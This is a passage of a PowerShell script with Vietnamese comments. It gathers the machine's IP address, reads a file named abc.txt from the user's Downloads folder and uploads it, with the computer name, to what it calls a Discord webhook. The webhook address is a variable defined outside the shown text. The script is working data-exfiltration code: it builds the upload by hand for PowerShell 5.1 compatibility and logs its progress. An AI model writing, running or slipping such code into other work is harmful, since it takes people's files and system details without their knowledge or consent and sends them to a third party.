# --- Lấy IP (fallback) ---
try {
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
} catch {
    $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
}

# --- Gửi file abc.txt với đúng multipart format ---
$filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
Write-Host "[*] Checking file at: $filePath"

# Kiểm tra file tồn tại trước
if (Test-Path $filePath) {
    Write-Host "[*] File found. Size: $((Get-Item $filePath).Length) bytes"

    # Tạo multipart/form-data bằng Invoke-RestMethod (nếu PowerShell 6+)
    # Nhưng để tương thích với PowerShell 5.1, ta dùng .NET
    try {
        # Tạo boundary ngẫu nhiên
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"
        
        # Tạo nội dung multipart thủ công (an toàn, không phụ thuộc .NET HttpClient)
        $LF = "`r`n"
        $bodyLines = @()
        
        # Part 1: payload_json
        $payloadJson = @{
            content = "File attached from $env:COMPUTERNAME"
            attachments = @(
                @{
                    id = 0
                    filename = "abc.txt"
                }
            )
        } | ConvertTo-Json
        
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
        $bodyLines += "Content-Type: application/json"
        $bodyLines += ""
        $bodyLines += $payloadJson
        
        # Part 2: file (files[0])
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"files[0]`"; filename=`"abc.txt`""
        $bodyLines += "Content-Type: application/octet-stream"
        $bodyLines += ""
        
        # Đọc file nhị phân
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        
        # Kết hợp tất cả thành một mảng byte
        $encoding = [System.Text.Encoding]::UTF8
        $headerBytes = $encoding.GetBytes(($bodyLines -join $LF) + $LF)
        $footerBytes = $encoding.GetBytes("$LF--$boundary--$LF")
        
        $allBytes = $headerBytes + $fileBytes + $footerBytes
        
        # Gửi request bằng Invoke-RestMethod với dữ liệu thô
        Write-Host "[*] Uploading file (size: $($allBytes.Length) bytes)..."
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $allBytes -ContentType $contentType
        
        Write-Host "[+] File uploaded successfully! Response: $($response | ConvertTo-Json)"
    } catch {
        Write-Host "[-] Upload failed: $($_.Exception.Message)"
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $reader.BaseStream.Position = 0
            $reader.DiscardBufferedData()
            $responseBody = $reader.ReadToEnd()
            Write-Host "[-] Discord response: $responseBody"
        }
    }
} else {
    Write-Host "[!] File not found at $filePath"
}
